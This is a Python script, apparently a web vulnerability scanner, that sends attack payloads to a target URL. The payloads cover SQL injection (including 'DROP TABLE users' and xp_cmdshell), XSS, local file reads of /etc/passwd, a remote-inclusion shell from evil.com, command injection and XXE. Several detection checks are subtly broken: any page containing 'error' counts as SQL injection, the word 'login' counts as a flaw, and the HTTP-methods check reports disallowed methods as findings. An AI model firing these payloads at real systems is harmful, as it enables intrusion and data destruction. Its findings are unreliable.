import requests
import json
import base64
import whois
import socket
import logging
from urllib.parse import urlparse

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Configuration for API Keys
API_KEYS = {
    "shodan": "your_shodan_api_key",
    "virustotal": "your_virustotal_api_key",
    "ssl_labs": "your_ssl_labs_api_key",
}

TARGET_URL = 'http://example.com'

def log_and_print(message):
    """Log the message and print it to the console."""
    logging.info(message)

def sql_injection_check(target_url):
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' AND 1=1 --",
        "' UNION SELECT username, password FROM users --",
        "'; DROP TABLE users; --",
        "1' OR '1'='1'",
        "'; EXEC xp_cmdshell('whoami'); --",
        "'; SELECT pg_sleep(5); --",  # Time-based
        "'; WAITFOR DELAY '00:00:05'; --",  # MS SQL Server time-based
        # Add more payloads as needed
    ]

    vulnerable = False
    log_and_print(f"Starting SQL Injection checks on: {target_url}")

    for payload in payloads:
        try:
            response = requests.get(target_url, params={"id": payload}, timeout=5)
            if any(keyword in response.text.lower() for keyword in ["syntax error", "mysql", "sql", "database", "ora-", "error"]):
                vulnerable = True
                log_and_print(f"[!] SQL Injection vulnerability detected with payload: {payload}")
        except requests.RequestException as e:
            log_and_print(f"Error during SQL Injection test with payload '{payload}': {e}")

    if not vulnerable:
        log_and_print("No SQL Injection vulnerability detected.")
    return vulnerable

def xss_check(target_url):
    xss_payloads = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "<svg/onload=alert('xss')>",
        "<a href=javascript:alert('xss')>Click me</a>",
        "<body onload=alert('xss')>",
        "<input autofocus onfocus=alert('xss')>",
        "%3Cscript%3Ealert('xss')%3C/script%3E",  # URL-encoded
        "&#60;script&#62;alert('xss')&#60;/script&#62;",  # HTML Entities
        # Add more payloads as needed
    ]

    vulnerable = False
    log_and_print(f"Starting XSS checks on: {target_url}")

    for payload in xss_payloads:
        try:
            response = requests.get(target_url, params={"input": payload}, timeout=5)
            if payload in response.text:
                vulnerable = True
                log_and_print(f"[!] XSS vulnerability detected with payload: {payload}")
        except requests.RequestException as e:
            log_and_print(f"Error during XSS test with payload '{payload}': {e}")

    if not vulnerable:
        log_and_print("No XSS vulnerability detected.")
    return vulnerable

def file_inclusion_check(target_url):
    lfi_payloads = ["../../etc/passwd", "../../var/log/apache2/access.log"]
    rfi_payloads = ["http://evil.com/shell.txt"]
    all_payloads = lfi_payloads + rfi_payloads

    vulnerable = False
    log_and_print(f"Starting File Inclusion checks on: {target_url}")

    for payload in all_payloads:
        try:
            response = requests.get(target_url, params={"file": payload}, timeout=5)
            if any(keyword in response.text.lower() for keyword in ["root:", "boot loader", "shell", "php", "environment"]):
                vulnerable = True
                log_and_print(f"[!] File Inclusion vulnerability detected with payload: {payload}")
        except requests.RequestException as e:
            log_and_print(f"Error during File Inclusion test with payload '{payload}': {e}")

    if not vulnerable:
        log_and_print("No File Inclusion vulnerabilities detected.")
    return vulnerable

def command_injection_check(target_url):
    command_payloads = [
        "; ls -la",
        "| ls",
        "; cat /etc/passwd",
        "&& whoami",
        # Add more command injection payloads as needed
    ]

    vulnerable = False
    log_and_print(f"Starting Command Injection checks on: {target_url}")

    for payload in command_payloads:
        try:
            response = requests.get(target_url, params={"cmd": payload}, timeout=5)
            if "root" in response.text.lower() or "permission denied" in response.text.lower():
                vulnerable = True
                log_and_print(f"[!] Command Injection vulnerability detected with payload: {payload}")
        except requests.RequestException as e:
            log_and_print(f"Error during Command Injection test with payload '{payload}': {e}")

    if not vulnerable:
        log_and_print("No Command Injection vulnerabilities detected.")
    return vulnerable

def csrf_check(target_url):
    log_and_print(f"Starting CSRF checks on: {target_url}")
    try:
        response = requests.get(target_url, timeout=5)
        if "csrf" not in response.text.lower():
            log_and_print("[!] CSRF token not found in response. Potential CSRF vulnerability.")
            return True
    except requests.RequestException as e:
        log_and_print(f"Error during CSRF check: {e}")

    log_and_print("CSRF check passed.")
    return False

def http_methods_check(target_url):
    """Checks which HTTP methods are allowed on the server."""
    allowed_methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "PATCH"]
    log_and_print(f"Checking allowed HTTP methods on: {target_url}")
    try:
        response = requests.options(target_url, timeout=5)
        methods = response.headers.get('Allow', '').split(', ')
        for method in allowed_methods:
            if method not in methods:
                log_and_print(f"[!] Method not allowed: {method}")
    except requests.RequestException as e:
        log_and_print(f"Error during HTTP methods check: {e}")

def xxe_check(target_url):
    """Checks for XML External Entity (XXE) injection vulnerabilities."""
    payload = "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///etc/passwd' > ]><foo>&xxe;</foo>"
    log_and_print(f"Starting XXE checks on: {target_url}")
    try:
        response = requests.post(target_url, data=payload, headers={'Content-Type': 'application/xml'}, timeout=5)
        if "root:" in response.text:
            log_and_print("[!] XXE vulnerability detected.")
    except requests.RequestException as e:
        log_and_print(f"Error during XXE check: {e}")

def csp_check(target_url):
    """Checks for the presence of Content Security Policy (CSP)."""
    log_and_print(f"Checking Content Security Policy on: {target_url}")
    try:
        response = requests.get(target_url, timeout=5)
        csp = response.headers.get('Content-Security-Policy')
        if not csp:
            log_and_print("[!] No Content Security Policy found.")
    except requests.RequestException as e:
        log_and_print(f"Error during CSP check: {e}")

def security_misconfigurations_check(target_url):
    """Checks for common security misconfigurations."""
    common_misconfigurations = ["admin", "test", "default", "backup", "login"]
    log_and_print(f"Checking for security misconfigurations on: {target_url}")
    for misconfiguration in common_misconfigurations:
        check_url = f"{target_url}/{misconfiguration}"
        try:
            response = requests.get(check_url, timeout=5)
            if response.status_code == 200:
                log_and_print(f"[!] Found potential misconfiguration at: {check_url}")
        except requests.RequestException as e:
            log_and_print(f"Error checking {misconfiguration}: {e}")

def http_security_headers_check(target_url):
    """Checks for important HTTP security headers."""
    insecure_headers = ["X-Content-Type-Options", "X-Frame-Options", "Content-Security-Policy"]
    missing_headers = []
    
    log_and_print(f"Checking HTTP security headers on: {target_url}")

    try:
        response = requests.get(target_url, timeout=5)
        for header in insecure_headers:
            if header not in response.headers:
                missing_headers.append(header)
                log_and_print(f"[!] Missing security header: {header}")
    except requests.RequestException as e:
        log_and_print(f"Error during HTTP Security Headers check: {e}")

    if not missing_headers:
        log_and_print("All recommended security headers are present.")
    return missing_headers

def enhanced_open_redirect_check(target_url):
    """Checks for open redirect vulnerabilities."""
    redirect_payloads = ["http://malicious.com", "//malicious.com"]
    vulnerable = False
    log_and_print(f"Starting Open Redirect checks on: {target_url}")

    for payload in redirect_payloads:
        try:
            response = requests.get(target_url, params={"redirect": payload}, timeout=5, allow_redirects=False)
            if response.status_code in (301, 302) and "Location" in response.headers:
                location = response.headers["Location"]
                if payload in location:
                    vulnerable = True
                    log_and_print(f"[!] Open Redirect vulnerability detected with payload: {payload}")
        except requests.RequestException as e:
            log_and_print(f"Error during Open Redirect test: {e}")

    if not vulnerable:
        log_and_print("No Open Redirect vulnerabilities detected.")
    return vulnerable

def auth_check(target_url):
    endpoints = ["login", "signin", "auth", "admin"]
    vulnerable = False

    log_and_print(f"Checking for exposed authentication endpoints on: {target_url}")
    try:
        response = requests.get(target_url, timeout=5)
        for endpoint in endpoints:
            if endpoint in response.text.lower():
                vulnerable = True
                log_and_print(f"[!] Authentication-related endpoint detected: {endpoint}")
    except requests.RequestException as e:
        log_and_print(f"Error during Authentication Exposure check: {e}")

    if not vulnerable:
        log_and_print("No exposed authentication endpoints detected.")
    return vulnerable

def server_misconfiguration_check(target_url):
    misconfigurations = {
        "Directory Listing": ["index of", "parent directory"],
        "Verbose Error Messages": ["exception", "error"],
        "Exposed Configuration Files": [".env", "config.php"],
    }

    detected_misconfigurations = {}
    log_and_print(f"Starting server misconfiguration checks on: {target_url}")

    try:
        response = requests.get(target_url, timeout=5)
        for config, keywords in misconfigurations.items():
            if any(keyword.lower() in response.text.lower() for keyword in keywords):
                detected_misconfigurations[config] = True
                log_and_print(f"[!] Server misconfiguration detected: {config}")
    except requests.RequestException as e:
        log_and_print(f"Error during Server Misconfiguration check: {e}")

    if not detected_misconfigurations:
        log_and_print("No server misconfigurations detected.")
    return detected_misconfigurations

def whois_info(target_url):
    domain = urlparse(target_url).netloc
    log_and_print(f"Fetching WHOIS information for: {domain}")

    try:
        whois_data = whois.whois(domain)
        relevant_info = {
            "Domain": whois_data.domain_name,
            "Registrar": whois_data.registrar,
            "Creation Date": whois_data.creation_date,
            "Expiration Date": whois_data.expiration_date,
            "Emails": whois_data.emails,
            "Name Servers": whois_data.name_servers,
        }
        return relevant_info
    except Exception as e:
        log_and_print(f"Error retrieving WHOIS data: {e}")
    return {}

def port_scan(target_url):
    common_ports = {
        21: "FTP", 22: "SSH", 23: "Telnet", 80: "HTTP", 443: "HTTPS",
        3306: "MySQL", 5432: "PostgreSQL", 6379: "Redis", 8080: "HTTP (Alt)", 4433: "HTTPS (Alt)"
    }

    domain = urlparse(target_url).netloc
    open_ports = {}
    log_and_print(f"Starting port scanning on: {domain} (Top common ports)")

    for port, service in common_ports.items():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)  # Set timeout for quick scans
            if sock.connect_ex((domain, port)) == 0:  # Port is open
                open_ports[port] = service
                log_and_print(f"[!] Open port detected: {port} ({service})")

    if not open_ports:
        log_and_print("No open ports detected.")
    return open_ports

def ssl_labs_scan(target_url):
    domain = urlparse(target_url).netloc
    ssl_url = f'https://api.ssllabs.com/api/v3/analyze?host={domain}'
    
    try:
        response = requests.get(ssl_url, timeout=10)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        log_and_print(f"Error in SSL Labs scan: {e}")
    return {}

def virustotal_scan(target_url):
    vt_url = 'https://www.virustotal.com/api/v3/urls'
    headers = {"x-apikey": API_KEYS["virustotal"]}
    vt_encoded_url = base64.urlsafe_b64encode(target_url.encode()).decode().strip("=")

    try:
        response = requests.get(f"{vt_url}/{vt_encoded_url}", headers=headers, timeout=10)
        response.raise_for_status()
        data = response.json().get('data', {}).get('attributes', {})
        return {
            "Last Analysis Stats": data.get("last_analysis_stats"),
            "Malicious Votes": data.get("total_votes", {}).get("malicious"),
            "Suspicious Votes": data.get("total_votes", {}).get("suspicious"),
            "Harmless Votes": data.get("total_votes", {}).get("harmless"),
        }
    except requests.RequestException as e:
        log_and_print(f"Error in VirusTotal scan: {e}")
    return {}

def generate_report(target_url, results):
    """Generates a detailed report summarizing all vulnerability checks."""
    report = {
        "Target URL": target_url,
        "SQL Injection": results["sql_injection"],
        "XSS Vulnerability": results["xss"],
        "File Inclusion": results["file_inclusion"],
        "Command Injection": results["command_injection"],
        "CSRF": results["csrf"],
        "HTTP Methods": results["http_methods"],
        "XXE": results["xxe"],
        "CSP": results["csp"],
        "Security Misconfigurations": results["security_misconfigurations"],
        "HTTP Security Headers": results["http_security_headers"],
        "Open Redirect": results["open_redirect"],
        "Authentication Exposure": results["auth_check"],
        "Server Misconfigurations": results["server_misconfiguration"],
        "WHOIS Info": results["whois_info"],
        "Open Ports": results["port_scan"],
        "SSL Labs Analysis": results["ssl_labs"],
        "VirusTotal Analysis": results["virustotal"]
    }

    with open('vulnerability_report.json', 'w') as f:
        json.dump(report, f, indent=4, default=str)
    log_and_print("[+] Report saved as vulnerability_report.json")

def main():
    """Runs all vulnerability checks and generates the report."""
    results = {
        "sql_injection": sql_injection_check(TARGET_URL),
        "xss": xss_check(TARGET_URL),
        "file_inclusion": file_inclusion_check(TARGET_URL),
        "command_injection": command_injection_check(TARGET_URL),
        "csrf": csrf_check(TARGET_URL),
        "http_methods": http_methods_check(TARGET_URL),
        "xxe": xxe_check(TARGET_URL),
        "csp": csp_check(TARGET_URL),
        "security_misconfigurations": security_misconfigurations_check(TARGET_URL),
        "http_security_headers": http_security_headers_check(TARGET_URL),
        "open_redirect": enhanced_open_redirect_check(TARGET_URL),
        "auth_check": auth_check(TARGET_URL),
        "server_misconfiguration": server_misconfiguration_check(TARGET_URL),
        "whois_info": whois_info(TARGET_URL),
        "port_scan": port_scan(TARGET_URL),
        "ssl_labs": ssl_labs_scan(TARGET_URL),
        "virustotal": virustotal_scan(TARGET_URL),
    }

    generate_report(TARGET_URL, results)

if __name__ == '__main__':
    main()
